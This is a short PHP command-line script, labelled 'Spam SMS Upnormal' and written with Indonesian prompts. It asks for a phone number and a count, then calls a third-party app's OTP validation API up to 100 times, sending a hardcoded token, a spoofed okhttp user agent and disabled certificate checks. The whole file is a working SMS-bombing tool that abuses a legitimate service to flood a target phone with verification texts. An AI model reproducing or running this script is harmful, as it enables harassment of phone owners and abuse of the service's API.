<?php

function otp($no){   
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL,"https://crp-app.stamps.co.id/api/auth/validate-mobile-number");
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, '{"mobile_number":"'.$no.'","token":"sI01tF5bOSYHabS7HaXiB1k3j0JxFxbcQ79Rd1HFBjKEKJqYAwSNMScsx9AEZq3O"}');
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_USERAGENT, 'okhttp/3.12.1');

        $headers = array();
        $headers[] = 'Host: crp-app.stamps.co.id';
        $headers[] = 'content-type:application/json; charset=utf-8';
        $headers[] = 'content-length:106';
        $headers[] = 'accept-encoding:gzip';
        curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

        $response = curl_exec ($ch);
        return $response;
        curl_close ($ch);
    }


$banner = "
============================================
     [+] Spam SMS Upnormal [+]
 Coded by  : SL
============================================\n";
echo $banner;

echo "[?] Masukan No: 0";
$no = trim(fgets(STDIN));

echo "[?] Masukan Jumlah: ";
$jumlah = trim(fgets(STDIN));
echo "\n";

if ($jumlah > 100) {
    echo "YAHAHAYUK";
}else {
    for ($i=0; $i<$jumlah; $i++) { 
        $otp = otp($no);
        $nomer = $i+1;
        echo "[{$nomer}] ";
        if (strpos($otp, '"Request was throttled')){
            echo "Gagal \n";
        }else {
            echo "Berhasil\n";
        }
        sleep(3);
    }
}

?>
